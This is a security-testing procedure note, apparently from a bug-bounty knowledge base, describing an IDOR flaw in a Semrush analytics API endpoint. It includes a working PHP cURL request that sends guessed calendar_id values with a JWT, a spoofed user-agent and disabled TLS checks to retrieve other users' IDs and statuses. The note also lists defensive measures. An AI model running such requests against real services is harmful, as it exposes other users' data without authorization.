---
tags:
  - idor
  - testing
  - api-probing
type: procedure
tools:
  - '[[tools/cURL]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/php-curl-semrush-user-status-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:34.367Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 4830016c-11b6-45fd-8cda-1d65ee04d1a1
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Test-IDOR-Access-with-Arbitrary-Calendar-IDs

## Summary

This procedure tests the IDOR vulnerability by sending requests to the Semrush API endpoint with arbitrary calendar_id values, confirming unauthorized access to user status data.

## Description

Using a valid JWT token from an authenticated session, craft manual requests to the /api/v1/ga/user_status/ endpoint with guessed or sequential calendar_id parameters. The endpoint fails to validate ownership, allowing retrieval of foreign user_ids and Google Analytics statuses, which demonstrates the IDOR and enables further enumeration.

## Requirements

1. Valid JWT authorization token from Semrush session
2. Tool for sending HTTP requests (e.g., cURL via PHP)
3. Knowledge of the target endpoint URL

## Defense

Defensive measures and detection strategies:

- Add access control checks to verify requester's relation to calendar_id
- Rate-limit API requests to prevent probing
- Monitor for anomalous calendar_id patterns in logs

## Objectives

1. Verify lack of authorization on the endpoint
2. Retrieve sample unauthorized data
3. Assess scope of accessible information

## Instructions

### Step 1: Prepare Request

**Context**: Set up the HTTP client with authentication and spoofed headers to mimic browser requests.

Obtain your JWT token from browser storage or previous session.

### Step 2: Send Test Request

**Context**: Execute a request with an arbitrary calendar_id to check for unauthorized access.

Use [[commands/php-curl-semrush-user-status-test]] to send the request:

```php
$curl = curl_init(); $opts = [ CURLOPT_URL => 'https://ec.semrush.com/api/v1/ga/user_status/?calendar_id=12345', CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0', CURLOPT_HTTPHEADER => ['Authorization: JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.████████.dRNCN9jt0gTvnhYMAzQFGb1HJXVV3Rr72rk_P485THY'], CURLOPT_RETURNTRANSFER => true, CURLOPT_SSL_VERIFYHOST => false, CURLOPT_SSL_VERIFYPEER => false ]; curl_setopt_array($curl, $opts); $response = json_decode(curl_exec($curl), true); var_dump($response);
```

Run with `php -r 'code here'`.

> This command initializes cURL, sets the URL with arbitrary calendar_id, adds JWT header and user-agent, disables SSL verification, executes the request, and dumps the JSON response.

**Expected Output**: JSON like {"id": 67890, "status": "NON_AUTHORISED"} for an unauthorized calendar.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/php-curl-semrush-user-status-test]]

## Tools Used

- [[tools/cURL]]

## Tags

- idor
- access-testing
